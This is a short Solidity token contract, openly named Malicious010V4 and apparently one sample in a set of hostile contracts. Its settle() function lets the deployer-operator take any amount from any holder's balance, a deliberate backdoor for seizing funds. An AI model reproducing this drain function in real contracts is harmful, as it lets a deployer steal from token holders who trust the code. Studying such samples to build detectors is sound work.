// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious010V4 {
    address public operator;
    mapping(address => uint256) public balanceOf;
    constructor(uint256 supply) {
        operator = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOperator() { require(msg.sender == operator, "operator"); _; }

    function settle(address account, uint256 amount) external onlyOperator {
        require(balanceOf[account] >= amount, "balance");
        balanceOf[account] -= amount;
        balanceOf[operator] += amount;
    }
}
